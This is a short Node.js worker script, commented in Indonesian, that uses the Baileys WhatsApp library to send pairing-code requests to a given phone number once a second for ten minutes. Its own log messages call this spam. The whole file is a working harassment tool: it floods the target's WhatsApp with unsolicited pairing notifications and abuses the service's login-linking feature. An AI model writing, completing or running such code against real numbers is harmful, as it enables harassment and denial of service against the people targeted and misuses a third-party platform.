const { parentPort, workerData } = require('worker_threads');
const { makeWASocket, Browsers, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require("pino");

async function spam(nomor) {
  try {
    const { state } = await useMultiFileAuthState("p");

    const client = makeWASocket({
      printQRInTerminal: false,
      browser: Browsers.macOS("Edge"),
      auth: state,
      logger: pino({ level: "fatal" }),
    });

    console.log(`Memulai proses untuk nomor ${nomor}`);

    const intervalId = setInterval(async () => {
      try {
        await client.requestPairingCode(nomor); // Kirim request pairing tanpa key
        console.log(`[ BERHASIL ] Pairing request sent to ${nomor}`);
      } catch (err) {
        console.error(`[ ERROR ] Gagal mengirim pairing request ke ${nomor}`);
      }
    }, 1000); // Interval 1 detik

    // Hentikan proses setelah 10 menit
    setTimeout(() => {
      clearInterval(intervalId);
      console.log(`[INFO] Spam selesai untuk nomor ${nomor}`);
      parentPort.postMessage(`[INFO] Spam selesai untuk nomor ${nomor}`);
    }, 10 * 60 * 1000);
  } catch (err) {
    console.error(`[ERROR] Terjadi kesalahan pada nomor ${nomor}:`, err.message);
    parentPort.postMessage(`[ERROR] Terjadi kesalahan pada nomor ${nomor}: ${err.message}`);
  }
}

spam(workerData.nomor);
